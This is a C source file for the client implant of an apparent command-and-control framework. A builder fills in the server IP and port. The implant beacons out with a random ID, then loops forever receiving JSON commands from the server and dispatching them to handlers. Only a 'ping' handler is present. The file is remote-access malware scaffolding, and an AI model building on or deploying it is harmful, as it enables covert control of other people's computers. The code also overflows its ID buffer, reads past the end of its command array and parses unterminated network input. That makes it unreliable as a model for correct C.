#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>

#include <cJSON.h>
#include <commands.h>
#include <socket.h>

#define IP %ip%
#define PORT %port%

typedef struct Command {
  char name[50];
  void (*func)(int client_fd, int job);
} Command;

void generate_id(char *out, int length) {
  const char CHARS[] = "abcdefghijklmnopqrstuvwxyz1234567890";

  srand((unsigned)time(NULL));
  char random[length + 1];

  int c = 0;
  int nbChars = sizeof(CHARS) - 1;

  for (int i = 0; i < length; i++) {
    c = rand() % nbChars;
    random[i] = CHARS[c];
  }

  random[length] = '\0';

  strcpy(out, random);
}

int command_exists(Command *commands_array, char *func_name, int arraylen) {
  for (int i = 0; i < arraylen; i++) {
    if (!(strcmp(commands_array[i].name, func_name))) {
      return i;
    }
  }

  return -1;
}

void cmds_execution(int client_fd, Command *commands, int commands_len) {
  char cmd[1024];
  while (1) {
    recv(client_fd, cmd, 1024, 0);

    cJSON *cmd_json = cJSON_Parse(cmd); // heap allocation

    char *cmd = cJSON_GetObjectItem(cmd_json, "exec")->valuestring;
    int job = cJSON_GetObjectItem(cmd_json, "job")->valueint;

    int index = command_exists(commands, cmd, commands_len);

    if (index < 0) {
      cJSON *response = cJSON_CreateObject();
      cJSON_AddStringToObject(response, "output", "");
      cJSON_AddBoolToObject(response, "success", 0);
      cJSON_AddNumberToObject(response, "job", job);
      cJSON_AddStringToObject(response, "type", "cmdout");

      char* response_str = cJSON_Print(response);

      send(client_fd, response_str, strlen(response_str), 0);

      cJSON_Delete(response);
    } else {
      commands[index].func(client_fd, job);
    }

    cJSON_Delete(cmd_json);
  }
}

int main() {
  char id[20];
  int commands_length = 0;
  Command commands[] = {
      {.name = "ping", .func = cmd_ping},
  };

  for (; commands[commands_length].name[0] != '\0'; commands_length++) {
  }

  generate_id(id, 20);

  int client_fd = connect_server_c2(IP, PORT);

  if (client_fd < 0) {
    return 1;
  }

  send(client_fd, id, strlen(id), 0);

  cmds_execution(client_fd, commands, commands_length);

  return 0;
}
